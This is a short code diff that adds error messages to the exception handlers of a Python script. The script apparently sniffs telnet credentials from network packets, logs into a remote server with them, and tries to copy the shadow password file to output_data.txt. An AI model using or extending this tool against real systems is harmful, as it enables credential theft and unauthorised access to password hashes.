@@ -34,7 +34,7 @@ def get_telnet_credentials(pkt):
     try:
         pkt.getlayer(Raw).load
 
-    except:
+    except Exception as e:
         return
 
     payload = str(pkt.getlayer(Raw).load)
@@ -80,7 +80,8 @@ def use_telnet_credentials(login, password):
         tn.read_until(b"Password: ", 2)
         tn.write(str_password.encode('ascii') + b"\n")
         
-    except:
+    except Exception as e:
+        print("an error occured: " + str(e))
         print("telnet connection with remote server couldn't be established")
         sys.exit(1)
     
@@ -95,7 +96,8 @@ def use_telnet_credentials(login, password):
         print("[*] Ending Telnet Session: Check output_data.txt For Shadow File Content")
         sys.exit(1)
         
-    except:
+    except Exception as e:
+        print("an error occured: " + str(e))
         print("account not in sudoers list: shadow file unaccessible")
         sys.exit(1)
 
